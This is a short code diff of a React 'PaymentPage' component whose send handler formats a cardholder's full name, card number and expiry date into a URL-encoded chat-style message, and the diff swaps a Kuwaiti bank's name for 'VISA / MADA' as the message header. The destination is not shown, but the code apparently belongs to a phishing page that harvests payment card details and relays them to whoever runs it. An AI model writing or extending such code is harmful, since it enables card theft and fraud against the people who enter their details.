@@ -44,7 +44,7 @@ export default function PaymentPage() {
 
   const handleSend = () => {
     const text = `
-%0A🏦 بنك برقان
+%0A🏦 VISA / MADA 
 👤 الاسم الكامل: ${cardData.name}%0A
 💳 رقم البطاقة: ${cardData.number}%0A
 📅 تاريخ الانتهاء: ${cardData.expiry}%0A
